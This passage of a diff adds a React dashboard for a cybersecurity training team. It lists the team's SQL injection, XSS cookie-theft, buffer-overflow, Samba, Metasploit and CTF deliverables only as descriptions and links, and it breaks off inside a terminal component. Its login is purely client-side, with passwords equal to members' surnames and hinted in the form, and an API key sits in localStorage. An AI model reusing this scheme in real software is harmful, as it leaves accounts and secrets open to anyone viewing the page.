@@ -1,0 +1,2439 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>digital_avengers // ops dashboard</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://unpkg.com/react@18.3.1/umd/react.development.js" integrity="sha384-hD6/rw4ppMLGNu3tX5cjIb+uRZ7UkRJ6BPkLpg4hAu/6onKUg4lLsHAs9EBPT82L" crossorigin="anonymous"></script>
+<script src="https://unpkg.com/react-dom@18.3.1/umd/react-dom.development.js" integrity="sha384-u6aeetuaXnQ38mYT8rp6sbXaQe3NL9t+IBXmnYxwkUI2Hw4bsp2Wvmx4yRQF1uAm" crossorigin="anonymous"></script>
+<script src="https://unpkg.com/@babel/standalone@7.29.0/babel.min.js" integrity="sha384-m08KidiNqLdpJqLq95G/LEi8Qvjl/xUYll3QILypMoQ65QorJ9Lvtp2RXYGBFj1y" crossorigin="anonymous"></script>
+<script src="https://unpkg.com/prop-types@15.8.1/prop-types.min.js"></script>
+<script src="https://unpkg.com/react-is@18.3.1/umd/react-is.production.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/recharts@2.12.7/umd/Recharts.min.js"></script>
+<script src="https://unpkg.com/lucide@0.454.0/dist/umd/lucide.js"></script>
+<style>
+  html, body, #root { height: 100%; }
+  body { background: #020617; color: #f1f5f9; font-family: ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; }
+  ::-webkit-scrollbar { width: 10px; height: 10px; }
+  ::-webkit-scrollbar-track { background: #020617; }
+  ::-webkit-scrollbar-thumb { background: #1e293b; border-radius: 4px; }
+  ::-webkit-scrollbar-thumb:hover { background: #334155; }
+  .font-mono, code, pre { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Cascadia Mono", Consolas, "Liberation Mono", monospace; }
+  @keyframes da-blink { 0%, 49% { opacity: 1 } 50%, 100% { opacity: 0 } }
+  .da-blink { animation: da-blink 1.05s steps(1) infinite; }
+  @keyframes da-pulse-dot {
+    0% { box-shadow: 0 0 0 0 rgba(16,185,129,0.55); }
+    70% { box-shadow: 0 0 0 6px rgba(16,185,129,0); }
+    100% { box-shadow: 0 0 0 0 rgba(16,185,129,0); }
+  }
+  .da-pulse-dot { animation: da-pulse-dot 1.8s infinite; }
+  @keyframes da-rise { from { transform: translateY(8px); } to { transform: translateY(0); } }
+  .da-rise { opacity: 1; animation: da-rise 380ms cubic-bezier(.22,.61,.36,1) both; }
+  @keyframes da-spin { to { transform: rotate(360deg); } }
+  .da-spin { animation: da-spin 0.8s linear infinite; }
+  .da-grid-bg {
+    background-image:
+      linear-gradient(rgba(148,163,184,0.05) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(148,163,184,0.05) 1px, transparent 1px);
+    background-size: 28px 28px;
+  }
+  .no-scrollbar::-webkit-scrollbar { display: none; }
+  .no-scrollbar { scrollbar-width: none; }
+</style>
+</head>
+<body class="bg-slate-950 text-slate-100 antialiased">
+  <div id="root"></div>
+<script type="text/babel">
+// Shared seed data. Synced with the real repo:
+// https://github.com/LorenzoPetrucci097/build-week-team-4-digital-avengers
+
+const MEMBERS = [
+  { id: "lp", name: "Lorenzo Petrucci",            role: "Team Leader · Pen Testing / CTF / Report", status: "online", initials: "LP" },
+  { id: "ck", name: "Christian Koscielniak Pinto", role: "Pen Testing · CTF · Report",               status: "online", initials: "CK" },
+  { id: "gc", name: "Gabriele Chinnici",           role: "LLM Specialist · Pen Testing",             status: "online", initials: "GC" },
+  { id: "ws", name: "Wafa Saghir",                 role: "C Dev · Malware Analysis · Report",        status: "online", initials: "WS" },
+  { id: "aa", name: "Amy Antonella Acosta Hugo",   role: "C Dev · Malware Analysis · Report",        status: "online", initials: "AA" },
+  { id: "dm", name: "Domenico Mendola",            role: "Pen Testing · CTF · Code",                 status: "online", initials: "DM" },
+  { id: "cv", name: "Corrado Vaccarecci",          role: "Pen Testing · CTF · Code",                 status: "online", initials: "CV" },
+];
+
+const REPO = {
+  org:  "LorenzoPetrucci097",
+  name: "build-week-team-4-digital-avengers",
+  url:  "https://github.com/LorenzoPetrucci097/build-week-team-4-digital-avengers",
+  branch: "main",
+};
+const blob = (path) => `${REPO.url}/blob/${REPO.branch}/${path}`;
+const tree = (path) => `${REPO.url}/tree/${REPO.branch}/${path}`;
+
+// Every folder / deliverable from the repo, mapped 1:1.
+const PROJECTS = [
+  {
+    id: "#D01", slug: "day1", path: "day1", title: "Day 1 — SQL Injection su DVWA",
+    status: "completed", sec: "SEC_LEVEL_3",
+    desc: "Sfruttamento sistematico della vulnerabilità SQLi su DVWA: estrazione dati da database MySQL, guida illustrata + report PDF.",
+    tags: ["SQLi", "DVWA", "Burp Suite", "MySQL"], date: "20.04.26", owner: "LP",
+    lang: "HTML", langColor: "#e34c26", url: tree("day1"),
+    artifacts: [
+      { name: "Guida_Illustrata_SQLi_DVWA_v2.html", kind: "guide", url: blob("day1/Guida_Illustrata_SQLi_DVWA_v2.html") },
+      { name: "Report_Day1_Task01_SQLi_DVWA.pdf",   kind: "pdf",   url: blob("day1/Report_Day1_Task01_SQLi_DVWA.pdf") },
+      { name: "img/",                               kind: "dir",   url: tree("day1/img") },
+    ],
+    featured: true,
+  },
+  {
+    id: "#D02", slug: "day2", path: "day2", title: "Day 2 — XSS & Cookie Theft",
+    status: "completed", sec: "SEC_LEVEL_3",
+    desc: "Attacco XSS su DVWA, cattura cookie via Python (Flask), analisi dei dati rubati, logs CSV/JSONL.",
+    tags: ["XSS", "DVWA", "Python", "Flask"], date: "21.04.26", owner: "CK",
+    lang: "Python", langColor: "#3572A5", url: tree("day2"),
+    artifacts: [
+      { name: "Guida_Illustrata_XSS_DVWA_v2.html", kind: "guide", url: blob("day2/Guida_Illustrata_XSS_DVWA_v2.html") },
+      { name: "cookie_catcher.py",                 kind: "code",  url: blob("day2/cookie_catcher.py") },
+      { name: "logs/",                             kind: "dir",   url: tree("day2/logs") },
+      { name: "Report_XSS_Day2/",                  kind: "dir",   url: tree("day2/Report_XSS_Day2") },
+    ],
+  },
+  {
+    id: "#D03", slug: "day3", path: "day3", title: "Day 3 — Buffer Overflow in C",
+    status: "completed", sec: "SEC_LEVEL_4",
+    desc: "Sviluppo exploit per buffer overflow, debugging con GDB, overflow ASLR-aware. BoF #1, BoF #2 + menu interattivo.",
+    tags: ["BoF", "GDB", "GCC", "C"], date: "22.04.26", owner: "WS",
+    lang: "C", langColor: "#555555", url: tree("day3"),
+    artifacts: [
+      { name: "Script/Bof_01.c",   kind: "code", url: blob("day3/Script/Bof_01.c") },
+      { name: "Script/Bof_02.c",   kind: "code", url: blob("day3/Script/Bof_02.c") },
+      { name: "Script/menu.c",     kind: "code", url: blob("day3/Script/menu.c") },
+      { name: "Script/input.txt",  kind: "text", url: blob("day3/Script/input.txt") },
+      { name: "report day 3.pdf",  kind: "pdf",  url: blob("day3/report%20day%203.pdf") },
+    ],
+  },
+  {
+    id: "#D04", slug: "day4", path: "day4", title: "Day 4 — Samba Exploitation",
+    status: "completed", sec: "SEC_LEVEL_4",
+    desc: "Ricognizione Samba con Nessus / Nmap, identificazione CVE, exploitation con tool custom, screenshot della catena d'attacco.",
+    tags: ["Samba", "Nessus", "Nmap", "CVE"], date: "23.04.26", owner: "DM",
+    lang: "PDF", langColor: "#b30b00", url: tree("day4"),
+    artifacts: [
+      { name: "Report_Day4_Samba_Exploit_DigitalAvengers.pdf", kind: "pdf", url: blob("day4/Report_Day4_Samba_Exploit_DigitalAvengers.pdf") },
+      { name: "img/",                                          kind: "dir", url: tree("day4/img") },
+    ],
+  },
+  {
+    id: "#D05", slug: "day5", path: "day5", title: "Day 5 — Metasploit Professional",
+    status: "completed", sec: "SEC_LEVEL_5",
+    desc: "Automazione exploit via Metasploit Framework, moduli custom, post-exploitation, msfvenom + handler.",
+    tags: ["Metasploit", "msfvenom", "Post-Ex"], date: "24.04.26", owner: "LP",
+    lang: "PDF", langColor: "#b30b00", url: tree("day5"),
+    artifacts: [
+      { name: "Report_Giorno5_Metasploit_Professionale.pdf", kind: "pdf", url: blob("day5/Report_Giorno5_Metasploit_Professionale.pdf") },
+    ],
+  },
+  {
+    id: "#C01", slug: "ctf-jangow01", path: "CTF-Jangow01", title: "CTF — Jangow01 (Extra)",
+    status: "completed", sec: "SEC_LEVEL_4",
+    desc: "Web CTF con kernel exploit (CVE-45010), escalazione privilegi, flag finale. Gobuster → Nmap → kernel exploit → root.",
+    tags: ["CTF", "Gobuster", "Nmap", "Kernel"], date: "extra", owner: "GC",
+    lang: "PDF", langColor: "#b30b00", url: tree("CTF-Jangow01"),
+    artifacts: [
+      { name: "Report_BuildWeek_Task_Extra01_Jangow01_DigitalAvengers.pdf", kind: "pdf", url: blob("CTF-Jangow01/Report_BuildWeek_Task_Extra01_Jangow01_DigitalAvengers.pdf") },
+      { name: "img/",                                                        kind: "dir", url: tree("CTF-Jangow01/img") },
+    ],
+  },
+  {
+    id: "#C02", slug: "ctf-lupinone", path: "CTF-LupinOne", title: "CTF — Lupin One (Extra)",
+    status: "completed", sec: "SEC_LEVEL_3",
+    desc: "Penetration testing indipendente con focus su exploitation e post-exploitation. Metasploit, network recon, privilege escalation.",
+    tags: ["CTF", "Metasploit", "PrivEsc"], date: "extra", owner: "CV",
+    lang: "PDF", langColor: "#b30b00", url: tree("CTF-LupinOne"),
+    artifacts: [
+      { name: "CTF_LupinOne_Report.pdf", kind: "pdf", url: blob("CTF-LupinOne/CTF_LupinOne_Report.pdf") },
+      { name: "img/",                    kind: "dir", url: tree("CTF-LupinOne/img") },
+    ],
+  },
+  {
+    id: "#C03", slug: "ctf-epicodeharryp", path: "CTF-EpicodeHarryP", title: "CTF — Harry Potter / EPICODE (Hard)",
+    status: "completed", sec: "SEC_LEVEL_5",
+    desc: "CTF livello DIFFICILE — 3 bandiere. Network recon, privilege escalation, SQLi, port knocking, decriptaggio.",
+    tags: ["CTF", "SQLi", "Knocking", "Crypto"], date: "extra", owner: "AA",
+    lang: "HTML", langColor: "#e34c26", url: tree("CTF-EpicodeHarryP"),
+    artifacts: [
+      { name: "Report_Day3_Bonus_BlackBox_DigitalAvengers.html", kind: "guide", url: blob("CTF-EpicodeHarryP/Report_Day3_Bonus_BlackBox_DigitalAvengers.html") },
+      { name: "img/",                                            kind: "dir",   url: tree("CTF-EpicodeHarryP/img") },
+    ],
+  },
+  {
+    id: "#C04", slug: "ctf-riccio-pazzo", path: "CTF Extra - Il Riccio Pazzo (Fatta dal team)", title: "CTF Extra — Il Riccio Pazzo (AI-powered)",
+    status: "completed", sec: "SEC_LEVEL_4",
+    desc: "Challenge AI-powered: Streamlit + OpenAI API + puzzle CTF, costruita dal team. Interfaccia interattiva per enigmi di sicurezza.",
+    tags: ["CTF", "Streamlit", "OpenAI", "Python"], date: "extra", owner: "GC",
+    lang: "Python", langColor: "#3572A5", url: tree("CTF%20Extra%20-%20Il%20Riccio%20Pazzo%20(Fatta%20dal%20team)"),
+    external: "https://github.com/Olliys/Riccio-Pazzo-CTF",
+    artifacts: [
+      { name: "Riccio/Riccio2.py",        kind: "code", url: blob("CTF%20Extra%20-%20Il%20Riccio%20Pazzo%20(Fatta%20dal%20team)/Riccio/Riccio2.py") },
+      { name: "Riccio/requirements.txt",  kind: "text", url: blob("CTF%20Extra%20-%20Il%20Riccio%20Pazzo%20(Fatta%20dal%20team)/Riccio/requirements.txt") },
+      { name: "README.md",                kind: "text", url: blob("CTF%20Extra%20-%20Il%20Riccio%20Pazzo%20(Fatta%20dal%20team)/README.md") },
+    ],
+  },
+];
+
+const MILESTONES = [
+  { id: "m1", date: "Day 1 · 20.04", title: "SQL Injection — DVWA",     state: "done",
+    bullets: ["Login bypass + UNION extraction", "Guida illustrata HTML", "Report PDF consegnato"] },
+  { id: "m2", date: "Day 2 · 21.04", title: "XSS & Cookie Theft",       state: "done",
+    bullets: ["Cookie catcher Flask live", "Logs CSV / JSONL archiviati", "Report XSS consegnato"] },
+  { id: "m3", date: "Day 3 · 22.04", title: "Buffer Overflow in C",     state: "done",
+    bullets: ["BoF #1 + BoF #2 in C", "Debugging con GDB", "Bonus: HarryP Black Box CTF"] },
+  { id: "m4", date: "Day 4 · 23.04", title: "Samba Exploitation",       state: "done",
+    bullets: ["Recon Nessus + Nmap", "CVE identificata ed exploit-ata", "Report con screenshots"] },
+  { id: "m5", date: "Day 5 · 24.04", title: "Metasploit Professional",  state: "done",
+    bullets: ["Moduli custom + msfvenom", "Post-exploitation end-to-end", "Report finale"] },
+  { id: "m6", date: "Extra",         title: "CTF × 4",                  state: "done",
+    bullets: ["Jangow01 · Lupin One", "HarryP / EPICODE (hard)", "Il Riccio Pazzo — AI-powered"] },
+];
+
+const mkSpark = (arr) => arr.map((v, i) => ({ i, v }));
+const KPIS = [
+  { key: "TASKS_COMPLETED", label: "TASKS_COMPLETED", value: "9/9",   delta: "+100%", up: true,
+    spark: mkSpark([1,3,4,5,6,7,8,9]) },
+  { key: "CVE_MAPPED",      label: "CVE_MAPPED",      value: "14",    delta: "+6",    up: true,
+    spark: mkSpark([2,4,6,8,10,12,13,14]) },
+  { key: "IOC_COLLECTED",   label: "IOC_COLLECTED",   value: "38",    delta: "+12",   up: true,
+    spark: mkSpark([8,14,20,25,28,32,35,38]) },
+  { key: "LINES_OF_CODE",   label: "LINES_OF_CODE",   value: "2,847", delta: "+312",  up: true,
+    spark: mkSpark([400,800,1200,1600,2000,2400,2650,2847]) },
+];
+
+const CONTACTS = [
+  { icon: "Github",       label: `github.com/${REPO.org}/${REPO.name}`, href: REPO.url },
+  { icon: "ExternalLink", label: "buildweek.epicode",                    href: REPO.url },
+  { icon: "Mail",         label: "squad07@digital-avengers.dev",         href: "#" },
+];
+
+Object.assign(window, { MEMBERS, PROJECTS, MILESTONES, KPIS, CONTACTS, REPO, blob, tree });
+
+// Shared atoms. Palette nods to paolorampino.it:
+//   kali-green terminal, classified amber, red stamps, teal accents.
+const { createElement, useEffect, useRef, useState, useMemo } = React;
+
+function Icon({ name, size = 16, className = "", strokeWidth = 1.75, style }) {
+  const ref = useRef(null);
+  useEffect(() => {
+    const root = ref.current;
+    if (!root) return;
+    root.innerHTML = "";
+    const lib = window.lucide;
+    if (!lib) return;
+    const icons = lib.icons || {};
+    const key = Object.keys(icons).find(k => k.toLowerCase() === String(name).toLowerCase());
+    const def = key ? icons[key] : null;
+    if (!def) return;
+    const svg = lib.createElement(def);
+    svg.setAttribute("width", size);
+    svg.setAttribute("height", size);
+    svg.setAttribute("stroke-width", strokeWidth);
+    svg.setAttribute("class", "");
+    root.appendChild(svg);
+  }, [name, size, strokeWidth]);
+  return <span ref={ref} className={`inline-flex items-center justify-center ${className}`} style={{ width: size, height: size, ...style }} aria-hidden="true" />;
+}
+
+function StatusDot({ tone = "emerald", pulse = false, size = 8, className = "" }) {
+  const map = {
+    emerald: "bg-emerald-500",
+    amber:   "bg-amber-400",
+    red:     "bg-red-500",
+    sky:     "bg-sky-400",
+    teal:    "bg-teal-400",
+    slate:   "bg-slate-500",
+  };
+  return (
+    <span
+      className={`inline-block rounded-full ${map[tone] || map.slate} ${pulse ? "da-pulse-dot" : ""} ${className}`}
+      style={{ width: size, height: size }}
+    />
+  );
+}
+
+function Badge({ tone = "slate", children, className = "" }) {
+  const map = {
+    emerald: "text-emerald-400 bg-emerald-500/10 ring-emerald-500/20",
+    amber:   "text-amber-300 bg-amber-500/10 ring-amber-500/30",
+    red:     "text-red-400 bg-red-500/10 ring-red-500/30",
+    sky:     "text-sky-400 bg-sky-500/10 ring-sky-500/20",
+    teal:    "text-teal-300 bg-teal-500/10 ring-teal-500/25",
+    slate:   "text-slate-400 bg-slate-800/60 ring-slate-700",
+  };
+  return (
+    <span className={`inline-flex items-center gap-1.5 rounded-md px-2 py-0.5 text-[10px] font-mono uppercase tracking-wider ring-1 ${map[tone]} ${className}`}>
+      {children}
+    </span>
+  );
+}
+
+// Amber "CLASSIFIED"-style stamp, paolorampino-ish.
+function ClassifiedStamp({ level = "SEC_LEVEL_3", className = "" }) {
+  const tone =
+    level === "SEC_LEVEL_5" ? "text-red-300 ring-red-500/40 bg-red-500/10"
+    : level === "SEC_LEVEL_4" ? "text-amber-200 ring-amber-500/40 bg-amber-500/10"
+    : level === "SEC_LEVEL_3" ? "text-amber-300 ring-amber-500/30 bg-amber-500/5"
+    : "text-teal-300 ring-teal-500/30 bg-teal-500/5";
+  return (
+    <span className={`inline-flex items-center gap-1 rounded-sm px-1.5 py-[1px] font-mono text-[9px] uppercase tracking-[0.22em] ring-1 ${tone} ${className}`}>
+      <Icon name="Lock" size={9} />
+      {level}
+    </span>
+  );
+}
+
+function Kbd({ children }) {
+  return (
+    <span className="inline-flex items-center rounded border border-slate-700 bg-slate-900/60 px-1.5 py-[1px] font-mono text-[10px] text-slate-400">
+      {children}
+    </span>
+  );
+}
+
+function Avatar({ initials = "??", size = 24, tone, ring = false, title }) {
+  // More saturated palette, nods to the reference site.
+  const palette = ["#22c55e","#14b8a6","#f59e0b","#e1615f","#8b5cf6","#06b6d4","#ef4444"];
+  const hash = useMemo(() => {
+    let h = 0;
+    for (const c of initials) h = (h * 31 + c.charCodeAt(0)) >>> 0;
+    return palette[h % palette.length];
+  }, [initials]);
+  const bg = tone || hash;
+  return (
+    <span
+      title={title}
+      className={`inline-flex items-center justify-center rounded-full font-mono font-semibold text-slate-950 ${ring ? "ring-2 ring-slate-950" : ""}`}
+      style={{
+        width: size, height: size,
+        fontSize: Math.max(9, size * 0.38),
+        background: `linear-gradient(135deg, ${bg}, ${bg}cc)`,
+      }}
+    >
+      {initials}
+    </span>
+  );
+}
+
+function SectionLabel({ children, className = "" }) {
+  return (
+    <div className={`text-[10px] font-mono uppercase tracking-[0.18em] text-slate-500 ${className}`}>
+      {children}
+    </div>
+  );
+}
+
+function Card({ className = "", children, ...rest }) {
+  return (
+    <div className={`rounded-lg border border-slate-800 bg-slate-900 ${className}`} {...rest}>
+      {children}
+    </div>
+  );
+}
+
+Object.assign(window, { Icon, StatusDot, Badge, ClassifiedStamp, Kbd, Avatar, SectionLabel, Card });
+
+// Auth — username = first name (lowercase), password = last name (lowercase).
+// State is in-memory per session, re-login required on refresh (no password storage).
+
+const AuthContext = React.createContext(null);
+
+// Build the credential table from MEMBERS.
+// "Christian Koscielniak Pinto" → username `christian`, password `pinto` (last token).
+function buildUsers() {
+  return MEMBERS.map((m) => {
+    const tokens = m.name.split(/\s+/);
+    const first  = tokens[0];
+    const last   = tokens[tokens.length - 1];
+    return {
+      id: m.id,
+      username: first.toLowerCase(),
+      password: last.toLowerCase(),
+      displayName: `${first} ${last[0]}.`,
+      fullName: m.name,
+      role: m.role.split("·")[0].trim(),
+      initials: m.initials,
+    };
+  });
+}
+
+function AuthProvider({ children }) {
+  const USERS = React.useMemo(buildUsers, []);
+  const [user, setUser]         = React.useState(null);
+  const [loginOpen, setLoginOpen] = React.useState(false);
+
+  const login = (username, password) => {
+    const u = USERS.find(
+      (x) =>
+        x.username === String(username).trim().toLowerCase() &&
+        x.password === String(password).trim().toLowerCase()
+    );
+    if (!u) return { ok: false, error: "Credenziali non valide." };
+    setUser(u);
+    return { ok: true, user: u };
+  };
+  const logout = () => setUser(null);
+
+  const value = { user, login, logout, USERS, loginOpen, setLoginOpen };
+  return (
+    <AuthContext.Provider value={value}>
+      {children}
+      <LoginModal />
+    </AuthContext.Provider>
+  );
+}
+
+function useAuth() {
+  const v = React.useContext(AuthContext);
+  if (!v) throw new Error("useAuth must be used inside <AuthProvider>");
+  return v;
+}
+
+function LoginModal() {
+  const { login, loginOpen, setLoginOpen } = useAuth();
+  const [username, setUsername] = React.useState("");
+  const [password, setPassword] = React.useState("");
+  const [error, setError]       = React.useState("");
+  const [showPw, setShowPw]     = React.useState(false);
+  const userRef = React.useRef(null);
+
+  React.useEffect(() => {
+    if (loginOpen) {
+      setUsername(""); setPassword(""); setError("");
+      setTimeout(() => userRef.current?.focus(), 10);
+    }
+  }, [loginOpen]);
+
+  React.useEffect(() => {
+    const onKey = (e) => { if (e.key === "Escape") setLoginOpen(false); };
+    if (loginOpen) window.addEventListener("keydown", onKey);
+    return () => window.removeEventListener("keydown", onKey);
+  }, [loginOpen, setLoginOpen]);
+
+  if (!loginOpen) return null;
+
+  const submit = (e) => {
+    e.preventDefault();
+    const res = login(username, password);
+    if (res.ok) setLoginOpen(false);
+    else setError(res.error);
+  };
+
+  return (
+    <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/70 backdrop-blur-sm">
+      <div
+        className="pointer-events-none absolute inset-0 da-grid-bg opacity-40"
+        aria-hidden="true"
+      />
+      <div
+        onClick={() => setLoginOpen(false)}
+        className="absolute inset-0"
+      />
+      <div className="relative w-full max-w-md overflow-hidden rounded-lg border border-slate-800 bg-slate-950 shadow-[0_20px_60px_-15px_rgba(0,0,0,0.8)]">
+        {/* Header — terminal-style */}
+        <div className="flex h-10 items-center gap-2 border-b border-slate-800 bg-slate-900/80 px-3">
+          <span className="inline-block h-2.5 w-2.5 rounded-full bg-red-500/80" />
+          <span className="inline-block h-2.5 w-2.5 rounded-full bg-amber-400/80" />
+          <span className="inline-block h-2.5 w-2.5 rounded-full bg-emerald-500/80" />
+          <span className="ml-2 font-mono text-[11px] text-slate-400">
+            <span className="text-emerald-400">auth</span>
+            <span className="text-slate-600">@</span>
+            <span className="text-sky-400">digital-avengers</span>
+            <span className="text-slate-600"> ~ </span>
+            <span className="text-slate-500">login</span>
+          </span>
+          <button
+            onClick={() => setLoginOpen(false)}
+            className="ml-auto rounded p-1 text-slate-500 hover:bg-slate-800 hover:text-slate-200"
+            title="close"
+          >
+            <Icon name="X" size={13} />
+          </button>
+        </div>
+
+        {/* Body */}
+        <div className="px-6 pb-6 pt-5">
+          <div className="mb-4">
+            <div className="font-mono text-[11px] text-emerald-400">&gt; request_access --node ops-hub</div>
+            <h2 className="mt-1 text-[18px] font-semibold tracking-tight text-slate-100">Operator login</h2>
+            <p className="mt-1 font-mono text-[11px] text-slate-500">
+              user · <span className="text-slate-400">first name</span>
+              <span className="mx-1.5 text-slate-700">|</span>
+              pass · <span className="text-slate-400">last name</span>
+            </p>
+          </div>
+
+          <form onSubmit={submit} className="space-y-3">
+            <label className="block">
+              <div className="mb-1 font-mono text-[10px] uppercase tracking-widest text-slate-500">username</div>
+              <div className="flex items-center gap-2 rounded-md border border-slate-800 bg-slate-900 px-2.5 focus-within:border-emerald-500/50 focus-within:ring-1 focus-within:ring-emerald-500/30">
+                <Icon name="User" size={13} className="text-slate-500" />
+                <input
+                  ref={userRef}
+                  value={username}
+                  onChange={(e) => setUsername(e.target.value)}
+                  autoCapitalize="off"
+                  autoComplete="username"
+                  spellCheck={false}
+                  className="w-full border-0 bg-transparent py-2 font-mono text-[13px] text-slate-100 placeholder:text-slate-600 focus:outline-none focus:ring-0"
+                  placeholder="lorenzo"
+                />
+              </div>
+            </label>
+
+            <label className="block">
+              <div className="mb-1 font-mono text-[10px] uppercase tracking-widest text-slate-500">password</div>
+              <div className="flex items-center gap-2 rounded-md border border-slate-800 bg-slate-900 px-2.5 focus-within:border-emerald-500/50 focus-within:ring-1 focus-within:ring-emerald-500/30">
+                <Icon name="Lock" size={13} className="text-slate-500" />
+                <input
+                  type={showPw ? "text" : "password"}
+                  value={password}
+                  onChange={(e) => setPassword(e.target.value)}
+                  autoCapitalize="off"
+                  autoComplete="current-password"
+                  spellCheck={false}
+                  className="w-full border-0 bg-transparent py-2 font-mono text-[13px] text-slate-100 placeholder:text-slate-600 focus:outline-none focus:ring-0"
+                  placeholder="••••••••"
+                />
+                <button
+                  type="button"
+                  onClick={() => setShowPw((s) => !s)}
+                  className="text-slate-500 hover:text-slate-300"
+                  title={showPw ? "hide" : "show"}
+                  tabIndex={-1}
+                >
+                  <Icon name={showPw ? "EyeOff" : "Eye"} size={13} />
+                </button>
+              </div>
+            </label>
+
+            {error && (
+              <div className="flex items-center gap-2 rounded-md border border-red-500/30 bg-red-500/10 px-2.5 py-1.5 font-mono text-[11px] text-red-300">
+                <Icon name="AlertTriangle" size={12} />
+                {error}
+              </div>
+            )}
+
+            <button
+              type="submit"
+              className="mt-1 flex w-full items-center justify-center gap-2 rounded-md bg-emerald-500 py-2 font-mono text-[12px] font-semibold uppercase tracking-widest text-slate-950 transition-colors hover:bg-emerald-400"
+            >
+              <Icon name="LogIn" size={13} />
+              sign in
+            </button>
+          </form>
+
+          <div className="mt-4 border-t border-slate-800 pt-3">
+            <div className="mb-1.5 font-mono text-[10px] uppercase tracking-widest text-slate-500">authorized operators</div>
+            <div className="flex flex-wrap gap-1">
+              {MEMBERS.map((m) => {
+                const first = m.name.split(/\s+/)[0].toLowerCase();
+                return (
+                  <button
+                    key={m.id}
+                    type="button"
+                    onClick={() => { setUsername(first); userRef.current?.focus(); }}
+                    className="inline-flex items-center gap-1 rounded border border-slate-800 bg-slate-900 px-1.5 py-0.5 font-mono text-[10px] text-slate-400 hover:border-emerald-500/40 hover:text-emerald-300"
+                    title="click to prefill username"
+                  >
+                    <Avatar initials={m.initials} size={14} />
+                    {first}
+                  </button>
+                );
+              })}
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+window.AuthContext  = AuthContext;
+window.AuthProvider = AuthProvider;
+window.useAuth      = useAuth;
+window.LoginModal   = LoginModal;
+
+// Interactive terminal — ls/cat/tree/find/report/readme/ai-key/ai-prompt/ai/chat.
+// Narrower footprint: sits to the right of the 16rem sidebar so it doesn't cover nav.
+
+// ---- Shared UI state (closed/minimized/expanded) for the Terminal ----
+// Exposes a global object `window.TerminalUI` with show()/toggle() so the
+// sidebar can reopen the terminal when the red button has closed it.
+const TerminalUIContext = React.createContext(null);
+
+function TerminalUIProvider({ children }) {
+  // closed  → completely hidden, reopen via sidebar button
+  // minimized → only the header bar is shown
+  // expanded → wider + taller, centered on page
+  const [closed,    setClosed]    = React.useState(false);
+  const [minimized, setMinimized] = React.useState(false);
+  const [expanded,  setExpanded]  = React.useState(false);
+
+  const api = {
+    closed, minimized, expanded,
+    show:     () => { setClosed(false); setMinimized(false); },
+    close:    () => setClosed(true),
+    toggleMin:() => setMinimized(m => !m),
+    toggleExp:() => setExpanded(e => !e),
+    toggleOpen:() => setClosed(c => !c),
+  };
+  React.useEffect(() => { window.TerminalUI = api; });
+  return <TerminalUIContext.Provider value={api}>{children}</TerminalUIContext.Provider>;
+}
+
+function useTerminalUI() {
+  const v = React.useContext(TerminalUIContext);
+  if (!v) throw new Error("useTerminalUI must be used inside <TerminalUIProvider>");
+  return v;
+}
+
+function Terminal() {
+  const PROMPT_USER = "team@digital-avengers";
+  const ui = useTerminalUI();
+
+  const [cwd, setCwd]              = React.useState("/");
+  const [lines, setLines]          = React.useState(() => [
+    { kind: "sys",  text: "Digital Avengers // ops-shell · v1.2" },
+    { kind: "sys",  text: "type `help` to see commands · `ai-help` for the assistant." },
+    { kind: "sys",  text: "" },
+  ]);
+  const [input, setInput]          = React.useState("");
+  const [history, setHistory]      = React.useState([]);
+  const [histIdx, setHistIdx]      = React.useState(-1);
+
+  // ---- AI state (persisted in localStorage, never shown in UI) ----
+  const AI_KEY_STORAGE    = "da.openrouter.key";
+  const AI_PROMPT_STORAGE = "da.openrouter.prompt";
+  const AI_MODEL_STORAGE  = "da.openrouter.model";
+  const AI_MODE_STORAGE   = "da.openrouter.mode";
+  const DEFAULT_PROMPT    = "You are ops-shell, the in-dashboard assistant for the Digital Avengers build-week team (7 operators, 9 cybersecurity deliverables: Day 1–5 + 4 CTF extras, all completed). Answer concisely in the user's language. When asked about projects, reference the deliverables by id (D01–D05, C01–C04). Default to offensive/defensive security perspective. Short paragraphs, no fluff.";
+  const DEFAULT_MODEL     = "openai/gpt-4o-mini";
+
+  const [aiKey,    setAiKey]    = React.useState(() => localStorage.getItem(AI_KEY_STORAGE) || "");
+  const [aiPrompt, setAiPrompt] = React.useState(() => localStorage.getItem(AI_PROMPT_STORAGE) || DEFAULT_PROMPT);
+  const [aiModel,  setAiModel]  = React.useState(() => localStorage.getItem(AI_MODEL_STORAGE) || DEFAULT_MODEL);
+  const [aiMode,   setAiMode]   = React.useState(() => localStorage.getItem(AI_MODE_STORAGE) === "1");
+  const [aiHistory, setAiHistory] = React.useState([]);   // in-memory chat history for AI
+  const [aiBusy,   setAiBusy]   = React.useState(false);
+
+  const bodyRef  = React.useRef(null);
+  const inputRef = React.useRef(null);
+
+  // Auto-scroll + focus
+  React.useEffect(() => {
+    const el = bodyRef.current;
+    if (el) el.scrollTop = el.scrollHeight;
+  }, [lines, ui.minimized, ui.closed]);
+  React.useEffect(() => { if (!ui.minimized && !ui.closed) inputRef.current?.focus(); }, [ui.minimized, ui.closed]);
+
+  // Persist AI config
+  React.useEffect(() => { localStorage.setItem(AI_KEY_STORAGE, aiKey); }, [aiKey]);
+  React.useEffect(() => { localStorage.setItem(AI_PROMPT_STORAGE, aiPrompt); }, [aiPrompt]);
+  React.useEffect(() => { localStorage.setItem(AI_MODEL_STORAGE, aiModel); }, [aiModel]);
+  React.useEffect(() => { localStorage.setItem(AI_MODE_STORAGE, aiMode ? "1" : "0"); }, [aiMode]);
+
+  // ---- filesystem metaphor (matches the real repo tree) ----
+  const FS = React.useMemo(() => {
+    const root = ["day1/", "day2/", "day3/", "day4/", "day5/", "ctf/", "team/", "README.md", "mission.txt"];
+    const ctf  = PROJECTS.filter(p => p.slug.startsWith("ctf-")).map(p => `${p.slug}/`);
+    const team = MEMBERS.map(m => `${m.initials.toLowerCase()}.md`);
+    const dirs = Object.fromEntries(PROJECTS.map(p => [`${p.slug}/`, p.artifacts.map(a => a.name)]));
